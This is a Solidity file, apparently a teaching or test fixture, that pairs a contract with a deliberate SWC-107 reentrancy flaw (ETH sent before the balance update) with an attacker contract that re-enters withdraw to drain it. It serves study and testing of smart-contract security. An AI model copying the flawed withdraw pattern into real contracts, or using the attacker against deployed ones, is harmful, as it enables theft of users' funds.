// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title ReentrancyVulnerable
 * @dev Test contract with SWC-107 reentrancy vulnerability
 * @notice DO NOT USE IN PRODUCTION - Educational purposes only
 */
contract ReentrancyVulnerable {
    mapping(address => uint256) public balances;

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);

    /**
     * @dev Deposit ETH into the contract
     */
    function deposit() external payable {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    /**
     * @dev VULNERABLE: Withdraw with reentrancy bug
     * @notice External call before state update allows reentrancy attack
     */
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // VULNERABILITY: External call before state update
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        // State update AFTER external call - vulnerable to reentrancy
        balances[msg.sender] -= amount;
        emit Withdrawal(msg.sender, amount);
    }

    /**
     * @dev Get contract balance
     */
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    receive() external payable {}
}

/**
 * @title ReentrancyAttacker
 * @dev Attack contract to exploit reentrancy vulnerability
 */
contract ReentrancyAttacker {
    ReentrancyVulnerable public target;
    uint256 public attackAmount;

    constructor(address _target) {
        target = ReentrancyVulnerable(payable(_target));
    }

    function attack() external payable {
        attackAmount = msg.value;
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    receive() external payable {
        if (address(target).balance >= attackAmount) {
            target.withdraw(attackAmount);
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
